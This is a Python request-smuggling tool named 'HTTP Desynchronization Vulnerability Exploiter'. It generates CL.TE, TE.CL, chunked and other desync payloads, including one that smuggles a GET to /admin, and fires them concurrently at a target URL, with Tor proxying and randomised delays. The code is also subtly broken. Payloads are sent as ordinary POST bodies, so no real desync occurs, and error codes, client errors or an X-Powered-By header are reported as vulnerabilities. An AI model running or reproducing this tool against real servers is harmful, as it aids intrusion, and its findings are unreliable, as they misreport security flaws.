import asyncio
import aiohttp
import argparse
import logging
import random
import string
import time
from typing import List, Dict, Any
from dataclasses import dataclass
from colorama import Fore, Style, init
import matplotlib.pyplot as plt
import seaborn as sns
from aiohttp import ClientTimeout, TCPConnector
from aiohttp.client_exceptions import ClientError
from urllib.parse import urlparse
import sqlite3
import json
from aiohttp_socks import ProxyConnector
import yaml
import os
from collections import defaultdict

# Initialize colorama for cross-platform colored output
init(autoreset=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class VulnerabilityResult:
    technique: str
    is_vulnerable: bool
    details: str
    response_time: float
    status_code: int
    response_size: int
    headers: Dict[str, str]

class DatabaseManager:
    def __init__(self, db_name: str = 'vulnerability_results.db'):
        self.conn = sqlite3.connect(db_name)
        self.create_table()

    def create_table(self):
        cursor = self.conn.cursor()
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS vulnerability_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_url TEXT,
            technique TEXT,
            is_vulnerable BOOLEAN,
            details TEXT,
            response_time REAL,
            status_code INTEGER,
            response_size INTEGER,
            headers TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        self.conn.commit()

    def store_result(self, target_url: str, result: VulnerabilityResult):
        cursor = self.conn.cursor()
        cursor.execute('''
        INSERT INTO vulnerability_results 
        (target_url, technique, is_vulnerable, details, response_time, status_code, response_size, headers)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (target_url, result.technique, result.is_vulnerable, result.details, 
              result.response_time, result.status_code, result.response_size, json.dumps(result.headers)))
        self.conn.commit()

    def close(self):
        self.conn.close()

class PayloadGenerator:
    @staticmethod
    def generate_cl_te_payload(host: str, random_path: str, random_param: str, random_value: str) -> str:
        return (
            f"POST {random_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{random_param}={random_value}"
        )

    @staticmethod
    def generate_te_cl_payload(host: str, random_path: str) -> str:
        chunk_size = hex(len(f"GET {random_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"))[2:]
        return (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
            f"{chunk_size}\r\n"
            f"GET {random_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )

    @staticmethod
    def generate_chunked_payload(host: str, random_path: str) -> str:
        return (
            f"POST {random_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
        )

class HTTPDesyncExploiter:
    def __init__(self, target_url: str, concurrency: int = 10, timeout: int = 10, debug: bool = False, proxy: str = None, config_file: str = None):
        self.target_url = target_url
        self.concurrency = concurrency
        self.timeout = timeout
        self.debug = debug
        self.proxy = proxy
        self.results: List[VulnerabilityResult] = []
        self.host = urlparse(target_url).netloc
        self.db_manager = DatabaseManager()
        self.session = None
        self.semaphore = asyncio.Semaphore(concurrency)
        self.cookies = {}
        self.config = self.load_config(config_file)
        self.retries = self.config.get('retries', 3)
        self.retry_delay = self.config.get('retry_delay', 1)

    def load_config(self, config_file: str) -> Dict[str, Any]:
        if config_file and os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return yaml.safe_load(f)
        return {}

    async def fetch_cookies(self):
        try:
            async with self.session.get(self.target_url) as response:
                self.cookies = dict(response.cookies)
                logger.info(f"Fetched cookies: {self.cookies}")
        except Exception as e:
            logger.error(f"Error fetching cookies: {str(e)}")

    async def run_tests(self):
        connector = ProxyConnector.from_url(self.proxy) if self.proxy else TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=ClientTimeout(total=self.timeout)) as self.session:
            await self.fetch_cookies()
            tasks = [
                self.test_technique("CL.TE"),
                self.test_technique("TE.CL"),
                self.test_technique("CL.CL"),
                self.test_technique("Invalid Headers"),
                self.test_technique("Chunked Encoding"),
                self.test_technique("HTTP/2 SETTINGS Frame"),
                self.test_technique("Trailer Header"),
                self.test_technique("Upgrade-Insecure-Requests"),
            ]
            await asyncio.gather(*tasks)

    async def test_technique(self, technique: str):
        async with self.semaphore:
            payloads = self.generate_payloads(technique)
            for payload in payloads:
                result = await self._send_request_with_retry(payload, technique)
                self.results.append(result)
                self.db_manager.store_result(self.target_url, result)
                if result.is_vulnerable:
                    logger.warning(f"Potential vulnerability detected: {technique}")
                await asyncio.sleep(random.uniform(0.5, 2.0))  # Random delay between requests

    async def _send_request_with_retry(self, payload: str, technique: str) -> VulnerabilityResult:
        for attempt in range(self.retries):
            try:
                return await self._send_request(payload, technique)
            except aiohttp.ClientError as e:
                if attempt < self.retries - 1:
                    delay = self.retry_delay * (2 ** attempt)  # Exponential backoff
                    logger.warning(f"Request failed, retrying in {delay} seconds... (Attempt {attempt + 1}/{self.retries})")
                    await asyncio.sleep(delay)
                else:
                    logger.error(f"Request failed after {self.retries} attempts: {str(e)}")
                    return VulnerabilityResult(technique, False, f"Error: {str(e)}", 0, 0, 0, {})

    def generate_payloads(self, technique: str) -> List[str]:
        payloads = []
        random_param = ''.join(random.choices(string.ascii_lowercase, k=5))
        random_value = ''.join(random.choices(string.ascii_lowercase, k=5))
        random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=5))

        if technique == "CL.TE":
            payloads.append(PayloadGenerator.generate_cl_te_payload(self.host, random_path, random_param, random_value))
        elif technique == "TE.CL":
            payloads.append(PayloadGenerator.generate_te_cl_payload(self.host, random_path))
        elif technique == "CL.CL":
            payloads.append(
                f"POST {random_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 6\r\n"
                f"Content-Length: 5\r\n"
                f"\r\n"
                f"12345{random_param}={random_value}"
            )
        elif technique == "Invalid Headers":
            payloads.append(
                f"POST {random_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 6\r\n"
                f"X-Invalid-Header: \x00\r\n"
                f"\r\n"
                f"{random_param}={random_value}"
            )
        elif technique == "Chunked Encoding":
            payloads.append(PayloadGenerator.generate_chunked_payload(self.host, random_path))
        elif technique == "HTTP/2 SETTINGS Frame":
            # This is a simplified representation, actual HTTP/2 frames would be binary
            payloads.append(
                f"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
                f"\x00\x00\x0c\x04\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x64\x00"
            )
        elif technique == "Trailer Header":
            payloads.append(
                f"POST {random_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 20\r\n"
                f"Trailer: X-Trailer-Header\r\n"
                f"\r\n"
                f"{random_param}={random_value}\r\n"
                f"X-Trailer-Header: trailer-value\r\n"
            )
        elif technique == "Upgrade-Insecure-Requests":
            payloads.append(
                f"GET {random_path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Upgrade-Insecure-Requests: 1\r\n"
                f"Connection: Upgrade\r\n"
                f"\r\n"
            )
        return payloads

    async def _send_request(self, payload: str, technique: str) -> VulnerabilityResult:
        start_time = time.time()
        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': '; '.join([f'{k}={v}' for k, v in self.cookies.items()])
            }
            async with self.session.post(self.target_url, data=payload.encode(), headers=headers) as response:
                content = await response.text()
                status = response.status
                response_time = time.time() - start_time
                response_size = len(content)
                headers = dict(response.headers)
                if self.debug:
                    logger.debug(f"Request payload:\n{payload}")
                    logger.debug(f"Response status: {status}")
                    logger.debug(f"Response headers: {headers}")
                    logger.debug(f"Response content:\n{content}")
                is_vulnerable = self._analyze_response(status, content, headers)
                details = self._generate_details(status, content, headers, is_vulnerable)
                return VulnerabilityResult(technique, is_vulnerable, details, response_time, status, response_size, headers)
        except ClientError as e:
            return VulnerabilityResult(technique, True, f"Potential vulnerability: Error occurred - {str(e)}", time.time() - start_time, 0, 0, {})

    def _analyze_response(self, status: int, content: str, headers: Dict[str, str]) -> bool:
        if status == 200 and "SMUGGLED" in content:
            return True
        if status in [400, 500, 502]:
            return True
        if any(header.lower() == 'x-powered-by' for header in headers):
            return True
        return False

    def _generate_details(self, status: int, content: str, headers: Dict[str, str], is_vulnerable: bool) -> str:
        details = []
        if is_vulnerable:
            if status == 200 and "SMUGGLED" in content:
                details.append("Response contains 'SMUGGLED'")
            if status in [400, 500, 502]:
                details.append(f"Unexpected status code: {status}")
            if any(header.lower() == 'x-powered-by' for header in headers):
                details.append("Server information leak detected")
        else:
            details.append(f"Not vulnerable: Status {status}")
        
        return ", ".join(details)

    def visualize_results(self):
        techniques = [result.technique for result in self.results]
        vulnerabilities = [result.is_vulnerable for result in self.results]
        response_times = [result.response_time for result in self.results]
        status_codes = [result.status_code for result in self.results]

        fig, ((ax1, ax2), (ax3, ax4)) = plt.subplots(2, 2, figsize=(15, 15))

        # Vulnerability bar chart
        sns.barplot(x=techniques, y=vulnerabilities, ax=ax1, palette=['red' if v else 'green' for v in vulnerabilities])
        ax1.set_title("Vulnerability Status by Technique")
        ax1.set_xlabel("Techniques")
        ax1.set_ylabel("Vulnerable (1) / Not Vulnerable (0)")
        ax1.set_ylim(0, 1.2)
        ax1.tick_params(axis='x', rotation=45)

        # Response time line graph
        sns.lineplot(x=techniques, y=response_times, ax=ax2, marker='o')
        ax2.set_title("Response Times for Each Technique")
        ax2.set_xlabel("Techniques")
        ax2.set_ylabel("Response Time (seconds)")
        ax2.tick_params(axis='x', rotation=45)
        ax2.grid(True)

        # Status code heatmap
        status_data = defaultdict(lambda: defaultdict(int))
        for technique, status in zip(techniques, status_codes):
            status_data[technique][status] += 1
        status_matrix = [[status_data[t][s] for s in set(status_codes)] for t in techniques]
        sns.heatmap(status_matrix, ax=ax3, cmap="YlOrRd", annot=True, fmt="d", 
                    xticklabels=sorted(set(status_codes)), yticklabels=techniques)
        ax3.set_title("Status Code Distribution by Technique")
        ax3.set_xlabel("Status Codes")
        ax3.set_ylabel("Techniques")

        # Vulnerability pie chart
        vulnerable_count = sum(vulnerabilities)
        not_vulnerable_count = len(vulnerabilities) - vulnerable_count
        ax4.pie([vulnerable_count, not_vulnerable_count], labels=['Vulnerable', 'Not Vulnerable'], 
                autopct='%1.1f%%', colors=['red', 'green'])
        ax4.set_title("Overall Vulnerability Distribution")

        plt.tight_layout()
        plt.savefig("vulnerability_results.png")
        logger.info("Results visualization saved as 'vulnerability_results.png'")

    def print_results(self):
        print("\n" + "=" * 50)
        print(f"{Fore.CYAN}HTTP Desynchronization Vulnerability Results:{Style.RESET_ALL}")
        print("=" * 50)
        for result in self.results:
            status = f"{Fore.RED}Vulnerable{Style.RESET_ALL}" if result.is_vulnerable else f"{Fore.GREEN}Not Vulnerable{Style.RESET_ALL}"
            print(f"{Fore.YELLOW}Technique:{Style.RESET_ALL} {result.technique}")
            print(f"{Fore.YELLOW}Status:{Style.RESET_ALL} {status}")
            print(f"{Fore.YELLOW}Details:{Style.RESET_ALL} {result.details}")
            print(f"{Fore.YELLOW}Response Time:{Style.RESET_ALL} {result.response_time:.2f} seconds")
            print(f"{Fore.YELLOW}Status Code:{Style.RESET_ALL} {result.status_code}")
            print(f"{Fore.YELLOW}Response Size:{Style.RESET_ALL} {result.response_size} bytes")
            print("-" * 50)

    def generate_html_report(self):
        html_content = f"""
        <html>
        <head>
            <title>HTTP Desynchronization Vulnerability Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; }}
                tr:nth-child(even) {{ background-color: #f2f2f2; }}
                th {{ padding-top: 12px; padding-bottom: 12px; text-align: left; background-color: #4CAF50; color: white; }}
                .vulnerable {{ color: red; }}
                .not-vulnerable {{ color: green; }}
            </style>
        </head>
        <body>
            <h1>HTTP Desynchronization Vulnerability Report for {self.target_url}</h1>
            <table>
                <tr>
                    <th>Technique</th>
                    <th>Vulnerable</th>
                    <th>Details</th>
                    <th>Response Time</th>
                    <th>Status Code</th>
                    <th>Response Size</th>
                </tr>
        """

        for result in self.results:
            vulnerability_class = "vulnerable" if result.is_vulnerable else "not-vulnerable"
            html_content += f"""
                <tr>
                    <td>{result.technique}</td>
                    <td class="{vulnerability_class}">{"Yes" if result.is_vulnerable else "No"}</td>
                    <td>{result.details}</td>
                    <td>{result.response_time:.2f} seconds</td>
                    <td>{result.status_code}</td>
                    <td>{result.response_size} bytes</td>
                </tr>
            """

        html_content += """
            </table>
            <h2>Visualization</h2>
            <img src="vulnerability_results.png" alt="Vulnerability Results Graph">
            <h2>Headers Analysis</h2>
            <pre>
        """

        # Add headers analysis
        for result in self.results:
            html_content += f"Technique: {result.technique}\n"
            for header, value in result.headers.items():
                html_content += f"  {header}: {value}\n"
            html_content += "\n"

        html_content += """
            </pre>
        </body>
        </html>
        """

        with open("vulnerability_report.html", "w") as f:
            f.write(html_content)
        logger.info("HTML report generated as 'vulnerability_report.html'")

    def export_results_json(self):
        results_json = json.dumps([vars(result) for result in self.results], indent=2)
        with open("vulnerability_results.json", "w") as f:
            f.write(results_json)
        logger.info("Results exported as 'vulnerability_results.json'")

async def main(args):
    exploiter = HTTPDesyncExploiter(args.url, args.concurrency, args.timeout, args.debug, args.proxy, args.config)
    await exploiter.run_tests()
    exploiter.print_results()
    exploiter.visualize_results()
    exploiter.generate_html_report()
    if args.export_json:
        exploiter.export_results_json()
    exploiter.db_manager.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Desynchronization Vulnerability Exploiter")
    parser.add_argument("url", help="Target URL to test")
    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent requests")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., socks5://127.0.0.1:9150 for Tor)")
    parser.add_argument("--config", help="Path to configuration file")
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase output verbosity (use -vv for even more)")
    parser.add_argument("--export-json", action="store_true", help="Export results as JSON")
    args = parser.parse_args()

    # Set up logging based on verbosity
    if args.verbose == 1:
        logging.getLogger().setLevel(logging.INFO)
    elif args.verbose >= 2:
        logging.getLogger().setLevel(logging.DEBUG)

    asyncio.run(main(args))
